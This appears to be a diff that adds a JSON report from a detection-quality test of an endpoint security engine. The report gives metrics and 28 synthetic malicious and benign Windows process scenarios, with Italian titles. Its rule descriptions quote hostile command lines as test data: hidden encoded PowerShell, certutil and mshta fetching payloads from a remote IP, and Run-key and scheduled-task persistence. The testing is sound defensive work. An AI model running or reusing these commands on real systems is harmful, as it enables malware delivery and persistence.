@@ -1,0 +1,545 @@
+{
+  "schema": "aegis-detection-quality-v1",
+  "baseline": "4.3",
+  "generated_at": "2026-11-19T10:06:12.455552+00:00",
+  "engine": "HeuristicEngine static rules (no DB/custom rules)",
+  "limitations": [
+    "Eventi sintetici, non traffico reale: non e' un benchmark di produzione.",
+    "La soglia thread e' simulata nel campo thread_count; non misura i thread del SO.",
+    "Nessun malware eseguito; i casi malicious sono costrutti di test.",
+    "Il confronto 5.0 deve usare lo stesso set e lo stesso comando."
+  ],
+  "metrics": {
+    "malicious_total": 14,
+    "benign_total": 14,
+    "tp": 14,
+    "fn": 0,
+    "fp": 5,
+    "tn": 9,
+    "precision": 0.7368,
+    "recall": 1.0,
+    "f1": 0.8485,
+    "false_positive_rate": 0.3571
+  },
+  "thread_threshold": [
+    {
+      "threads": 180,
+      "detected": false,
+      "severity": "NONE"
+    },
+    {
+      "threads": 200,
+      "detected": false,
+      "severity": "NONE"
+    },
+    {
+      "threads": 201,
+      "detected": true,
+      "severity": "MEDIUM"
+    },
+    {
+      "threads": 300,
+      "detected": true,
+      "severity": "MEDIUM"
+    }
+  ],
+  "scenarios": [
+    {
+      "id": "mal-office-powershell",
+      "group": "malicious",
+      "title": "Word apre PowerShell encoded",
+      "expected": true,
+      "detected": true,
+      "severity": "CRITICAL",
+      "rules": [
+        {
+          "rule_id": "AEGIS-S002",
+          "severity": "CRITICAL",
+          "confidence": "high",
+          "description": "Office process spawning script interpreter: 'WINWORD.EXE' -> 'powershell.exe'."
+        },
+        {
+          "rule_id": "AEGIS-S007",
+          "severity": "HIGH",
+          "confidence": "high",
+          "description": "Encoded/obfuscated command detected in 'powershell.exe': possible payload."
+        },
+        {
+          "rule_id": "AEGIS-S009",
+          "severity": "MEDIUM",
+          "confidence": "low",
+          "description": "Script interpreter 'powershell.exe' detected."
+        },
+        {
+          "rule_id": "AEGIS-S012",
+          "severity": "HIGH",
+          "confidence": "medium",
+          "description": "LOLBin 'powershell.exe' with suspicious arguments: 'powershell -NoP -W Hidden -EncodedCommand SQBFAFgAIABOAEUAVwAtAE8AQgBKAEUAQwBUAA=='."
+        }
+      ],
+      "correct": true
+    },
+    {
+      "id": "mal-encoded-only",
+      "group": "malicious",
+      "title": "PowerShell encoded senza parent sospetto",
+      "expected": true,
+      "detected": true,
+      "severity": "HIGH",
+      "rules": [
+        {
+          "rule_id": "AEGIS-S007",
+          "severity": "HIGH",
+          "confidence": "high",
+          "description": "Encoded/obfuscated command detected in 'powershell.exe': possible payload."
+        },
+        {
+          "rule_id": "AEGIS-S009",
+          "severity": "MEDIUM",
+          "confidence": "low",
+          "description": "Script interpreter 'powershell.exe' detected."
+        },
+        {
+          "rule_id": "AEGIS-S012",
+          "severity": "HIGH",
+          "confidence": "medium",
+          "description": "LOLBin 'powershell.exe' with suspicious arguments: 'powershell -enc SQBFAFgAIABOAEUAVwAtAE8AQgBKAEUAQwBUAA=='."
+        }
+      ],
+      "correct": true
+    },
+    {
+      "id": "mal-certutil-download",
+      "group": "malicious",
+      "title": "certutil scarica ed esegue",
+      "expected": true,
+      "detected": true,
+      "severity": "HIGH",
+      "rules": [
+        {
+          "rule_id": "AEGIS-S012",
+          "severity": "HIGH",
+          "confidence": "medium",
+          "description": "LOLBin 'certutil.exe' with suspicious arguments: 'certutil -urlcache -split -f http://203.0.113.9/a.exe C:\\Users\\Public\\a.exe'."
+        }
+      ],
+      "correct": true
+    },
+    {
+      "id": "mal-renamed-mimikatz",
+      "group": "malicious",
+      "title": "Mimikatz rinominato svchost in Users\\Public",
+      "expected": true,
+      "detected": true,
+      "severity": "CRITICAL",
+      "rules": [
+        {
+          "rule_id": "AEGIS-S001",
+          "severity": "CRITICAL",
+          "confidence": "high",
+          "description": "Known attack tool invoked via command line: 'svchost.exe'."
+        },
+        {
+          "rule_id": "AEGIS-S004",
+          "severity": "HIGH",
+          "confidence": "medium",
+          "description": "Process 'svchost.exe' executing from suspicious path: 'C:\\Users\\Public\\svchost.exe'."
+        },
+        {
+          "rule_id": "AEGIS-S015",
+          "severity": "HIGH",
+          "confidence": "medium",
+          "description": "Suspicious persistence-like process name (variant of 'svchost'): 'svchost.exe'."
+        }
+      ],
+      "correct": true
+    },
+    {
+      "id": "mal-chrome-svchost",
+      "group": "malicious",
+      "title": "Browser genera svchost (injection/hollowing)",
+      "expected": true,
+      "detected": true,
+      "severity": "HIGH",
+      "rules": [
+        {
+          "rule_id": "AEGIS-S002",
+          "severity": "HIGH",
+          "confidence": "high",
+          "description": "User application spawning a system process: 'chrome.exe' -> 'svchost.exe'."
+        }
+      ],
+      "correct": true
+    },
+    {
+      "id": "mal-thread-201",
+      "group": "malicious",
+      "title": "Processo con 201 thread (soglia >200)",
+      "expected": true,
+      "detected": true,
+      "severity": "MEDIUM",
+      "rules": [
+        {
+          "rule_id": "AEGIS-S013",
+          "severity": "MEDIUM",
+          "confidence": "low",
+          "description": "Process 'unknown.exe' has abnormally high thread count: 201. Possible injection."
+        }
+      ],
+      "correct": true
+    },
+    {
+      "id": "mal-thread-300",
+      "group": "malicious",
+      "title": "Processo con 300 thread",
+      "expected": true,
+      "detected": true,
+      "severity": "MEDIUM",
+      "rules": [
+        {
+          "rule_id": "AEGIS-S013",
+          "severity": "MEDIUM",
+          "confidence": "low",
+          "description": "Process 'unknown.exe' has abnormally high thread count: 300. Possible injection."
+        }
+      ],
+      "correct": true
+    },
+    {
+      "id": "mal-dll-side-load",
+      "group": "malicious",
+      "title": "DLL caricata da AppData\\Local\\Temp",
+      "expected": true,
+      "detected": true,
+      "severity": "HIGH",
+      "rules": [
+        {
+          "rule_id": "AEGIS-S011",
+          "severity": "HIGH",
+          "confidence": "medium",
+          "description": "Possible DLL hijacking: 'C:\\Users\\vic\\AppData\\Local\\Temp\\evil.dll' loaded from suspicious path."
+        }
+      ],
+      "correct": true
+    },
+    {
+      "id": "mal-run-key",
+      "group": "malicious",
+      "title": "reg add su Run key",
+      "expected": true,
+      "detected": true,
+      "severity": "HIGH",
+      "rules": [
+        {
+          "rule_id": "AEGIS-S016",
+          "severity": "HIGH",
+          "confidence": "high",
+          "description": "Autorun registry key written by 'reg.exe': 'reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\Users\\Public\\x.exe /f'."
+        }
+      ],
+      "correct": true
+    },
+    {
+      "id": "mal-schtasks-encoded",
+      "group": "malicious",
+      "title": "Task pianificato che esegue PowerShell encoded",
+      "expected": true,
+      "detected": true,
+      "severity": "CRITICAL",
+      "rules": [
+        {
+          "rule_id": "AEGIS-S012",
+          "severity": "HIGH",
+          "confidence": "medium",
+          "description": "LOLBin 'schtasks.exe' with suspicious arguments: 'schtasks /create /tn X /tr \"powershell -nop -w hidden -e SQBFAFgA\" /sc minute /mo 5 /f'."
+        },
+        {
+          "rule_id": "AEGIS-S017",
+          "severity": "CRITICAL",
+          "confidence": "high",
+          "description": "Scheduled task created by 'schtasks.exe' running a script interpreter: 'schtasks /create /tn X /tr \"powershell -nop -w hidden -e SQBFAFgA\" /sc minute /mo 5 /f'."
+        }
+      ],
+      "correct": true
+    },
+    {
+      "id": "mal-system-powershell",
+      "group": "malicious",
+      "title": "services.exe genera PowerShell",
+      "expected": true,
+      "detected": true,
+      "severity": "CRITICAL",
+      "rules": [
+        {
+          "rule_id": "AEGIS-S002",
+          "severity": "CRITICAL",
+          "confidence": "high",
+          "description": "System process spawning script interpreter: 'services.exe' -> 'powershell.exe'."
+        },
+        {
+          "rule_id": "AEGIS-S009",
+          "severity": "MEDIUM",
+          "confidence": "low",
+          "description": "Script interpreter 'powershell.exe' detected."
+        }
+      ],
+      "correct": true
+    },
+    {
+      "id": "mal-double-extension",
+      "group": "malicious",
+      "title": "Doppia estensione in Users\\Public",
+      "expected": true,
+      "detected": true,
+      "severity": "HIGH",
+      "rules": [
+        {
+          "rule_id": "AEGIS-S004",
+          "severity": "HIGH",
+          "confidence": "medium",
+          "description": "Process 'invoice.pdf.exe' executing from suspicious path: 'C:\\Users\\Public\\invoice.pdf.exe'."
+        },
+        {
+          "rule_id": "AEGIS-S006",
+          "severity": "HIGH",
+          "confidence": "high",
+          "description": "Double extension detected in 'invoice.pdf.exe'."
+        }
+      ],
+      "correct": true
+    },
+    {
+      "id": "hard-rundll32-javascript",
+      "group": "malicious",
+      "title": "rundll32 con javascript: (tecnica difficile)",
+      "expected": true,
+      "detected": true,
+      "severity": "MEDIUM",
+      "rules": [
+        {
+          "rule_id": "AEGIS-S002",
+          "severity": "MEDIUM",
+          "confidence": "high",
+          "description": "Explorer spawning LOLBin: 'explorer.exe' -> 'rundll32.exe'."
+        },
+        {
+          "rule_id": "AEGIS-S009",
+          "severity": "MEDIUM",
+          "confidence": "low",
+          "description": "Script interpreter 'rundll32.exe' detected."
+        }
+      ],
+      "correct": true
+    },
+    {
+      "id": "hard-mshta-url",
+      "group": "malicious",
+      "title": "mshta con URL remoto",
+      "expected": true,
+      "detected": true,
+      "severity": "HIGH",
+      "rules": [
+        {
+          "rule_id": "AEGIS-S009",
+          "severity": "MEDIUM",
+          "confidence": "low",
+          "description": "Script interpreter 'mshta.exe' detected."
+        },
+        {
+          "rule_id": "AEGIS-S012",
+          "severity": "HIGH",
+          "confidence": "medium",
+          "description": "LOLBin 'mshta.exe' with suspicious arguments: 'mshta.exe http://203.0.113.9/payload.hta'."
+        }
+      ],
+      "correct": true
+    },
+    {
+      "id": "benign-chrome",
+      "group": "benign",
+      "title": "Chrome normale",
+      "expected": false,
+      "detected": false,
+      "severity": "NONE",
+      "rules": [],
+      "correct": true
+    },
+    {
+      "id": "benign-powershell-getchilditem",
+      "group": "benign",
+      "title": "PowerShell amministrativo Get-ChildItem",
+      "expected": false,
+      "detected": true,
+      "severity": "MEDIUM",
+      "rules": [
+        {
+          "rule_id": "AEGIS-S002",
+          "severity": "MEDIUM",
+          "confidence": "high",
+          "description": "Explorer spawning LOLBin: 'explorer.exe' -> 'powershell.exe'."
+        },
+        {
+          "rule_id": "AEGIS-S009",
+          "severity": "MEDIUM",
+          "confidence": "low",
+          "description": "Script interpreter 'powershell.exe' detected."
+        }
+      ],
+      "correct": false
+    },
+    {
+      "id": "benign-cmd-dir",
+      "group": "benign",
+      "title": "cmd /c dir",
+      "expected": false,
+      "detected": true,
+      "severity": "MEDIUM",
+      "rules": [
+        {
+          "rule_id": "AEGIS-S002",
+          "severity": "MEDIUM",
+          "confidence": "high",
+          "description": "Explorer spawning LOLBin: 'explorer.exe' -> 'cmd.exe'."
+        },
+        {
+          "rule_id": "AEGIS-S009",
+          "severity": "MEDIUM",
+          "confidence": "low",
+          "description": "Script interpreter 'cmd.exe' detected."
+        }
+      ],
+      "correct": false
+    },
+    {
+      "id": "benign-python-print",
+      "group": "benign",
+      "title": "Python installato in Program Files",
+      "expected": false,
+      "detected": true,
+      "severity": "MEDIUM",
+      "rules": [
+        {
+          "rule_id": "AEGIS-S009",
+          "severity": "MEDIUM",
+          "confidence": "low",
+          "description": "Script interpreter 'python.exe' detected."
+        }
+      ],
+      "correct": false
+    },
+    {
+      "id": "benign-certutil-hash",
+      "group": "benign",
+      "title": "certutil -hashfile",
+      "expected": false,
+      "detected": false,
+      "severity": "NONE",
+      "rules": [],
+      "correct": true
+    },
+    {
+      "id": "benign-rundll32-printui",
+      "group": "benign",
+      "title": "rundll32 printui.dll",
+      "expected": false,
+      "detected": true,
+      "severity": "MEDIUM",
+      "rules": [
+        {
+          "rule_id": "AEGIS-S009",
+          "severity": "MEDIUM",
+          "confidence": "low",
+          "description": "Script interpreter 'rundll32.exe' detected."
+        }
+      ],
+      "correct": false
+    },
+    {
+      "id": "benign-svchost-empty-path",
+      "group": "benign",
+      "title": "svchost con path non leggibile",
+      "expected": false,
+      "detected": false,
+      "severity": "NONE",
+      "rules": [],
+      "correct": true
+    },
+    {
+      "id": "benign-explorer-chrome",
+      "group": "benign",
+      "title": "Explorer apre Chrome",
+      "expected": false,
+      "detected": false,
+      "severity": "NONE",
+      "rules": [],
+      "correct": true
+    },
+    {
+      "id": "benign-whoami",
+      "group": "benign",
+      "title": "whoami senza /all",
+      "expected": false,
+      "detected": false,
+      "severity": "NONE",
+      "rules": [],
+      "correct": true
+    },
+    {
+      "id": "benign-reg-query",
+      "group": "benign",
+      "title": "reg query della Run key",
+      "expected": false,
+      "detected": false,
+      "severity": "NONE",
+      "rules": [],
+      "correct": true
+    },
+    {
+      "id": "benign-schtasks-query",
+      "group": "benign",
+      "title": "schtasks /query",
+      "expected": false,
+      "detected": false,
+      "severity": "NONE",
+      "rules": [],
+      "correct": true
+    },
+    {
+      "id": "benign-edge-renderer",
+      "group": "benign",
+      "title": "Edge renderer con 180 thread",
+      "expected": false,
+      "detected": false,
+      "severity": "NONE",
+      "rules": [],
+      "correct": true
+    },
+    {
+      "id": "benign-notepad-temp",
+      "group": "benign",
+      "title": "Notepad apre un file in Temp",
+      "expected": false,
+      "detected": false,
+      "severity": "NONE",
+      "rules": [],
+      "correct": true
+    },
+    {
+      "id": "benign-signed-installer",
+      "group": "benign",
+      "title": "Installer firmato in Downloads",
+      "expected": false,
+      "detected": true,
+      "severity": "LOW",
+      "rules": [
+        {
+          "rule_id": "AEGIS-S004",
+          "severity": "LOW",
+          "confidence": "low",
+          "description": "Process 'setup.exe' executing from suspicious path: 'C:\\Users\\vic\\Downloads\\setup.exe'."
+        }
+      ],
+      "correct": false
+    }
+  ]
+}
